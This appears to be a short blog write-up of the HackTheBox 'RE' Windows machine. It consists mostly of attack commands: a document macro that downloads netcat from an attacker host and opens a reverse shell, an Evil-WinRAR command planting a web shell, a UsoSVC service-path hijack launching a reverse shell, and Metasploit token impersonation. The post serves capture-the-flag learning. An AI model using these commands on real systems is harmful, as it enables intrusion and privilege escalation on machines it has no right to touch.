---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/_0UuRTxFfjA/0.jpg
layout: post
media_subpath: /assets/posts/2020-02-01-re-hackthebox
tags:
- hackthebox
- metasploit
- phishing
- token
- usosvc
- windows
- winrar
title: RE @ HackTheBox
---

RE is a 40 point windows machine on HackTheBox that involves uploading an ods file with a malicious macro, abusing a winrar vulnerability and using UsoSVC together with metasploit’s incognito module to become root.

{% youtube _0UuRTxFfjA %}

## Notes

ODS Macro:

```
Sub Run_at_open
Shell("certutil.exe -urlcache -split -f 'http://<lhost>:8000/nc.exe' C:\Windows\System32\spool\drivers\color\nc.exe")
Shell("C:\Windows\System32\spool\drivers\color\nc.exe <lhost> 7000 -ecmd.exe")
End Sub
```

[EvilWinRar](https://github.com/manulqwerty/Evil-WinRAR-Gen):

```
python3 evilWinRAR.py -e xct_shell.aspx -p 'c:\inetpub\wwwroot\re\' -o xct.rar
```

UsoSVC:

```
sc config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe <lhost> 9000 -e cmd.exe"
sc stop usosvc
sc start usosvc
```

Incognito:

```
use incognito
list_tokens -u
impersonate_token RE\\coby
```